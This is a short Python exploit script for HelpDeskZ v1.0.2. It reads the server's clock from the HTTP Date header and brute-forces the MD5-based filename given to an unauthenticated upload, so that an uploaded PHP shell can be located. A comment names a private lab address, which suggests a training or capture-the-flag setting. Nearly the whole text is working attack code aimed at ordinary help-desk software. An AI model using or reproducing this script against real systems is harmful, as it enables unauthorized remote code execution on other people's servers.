# Shell upload directory: http://10.10.10.120/support/uploads/tickets/
import hashlib
import time
import sys
import requests
import datetime

print('Helpdeskz v1.0.2 - Unauthenticated shell upload exploit')

if len(sys.argv) < 3:
    print("Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0]))
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext.encode('utf-8')).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print('found!')
        print(url)
        sys.exit(0)

print('Sorry, I did not find anything')
